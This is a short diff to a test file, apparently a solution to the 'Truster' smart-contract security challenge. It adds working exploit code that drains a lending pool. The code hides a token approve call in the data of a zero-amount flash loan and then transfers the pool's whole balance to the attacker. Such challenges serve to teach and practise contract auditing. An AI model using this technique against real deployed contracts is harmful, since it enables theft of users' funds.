@@ -31,6 +31,11 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const callData = this.token.interface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL]);
+        const anyAddress = attacker.address;
+
+        await this.pool.connect(attacker).flashLoan(0, anyAddress, this.token.address, callData);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
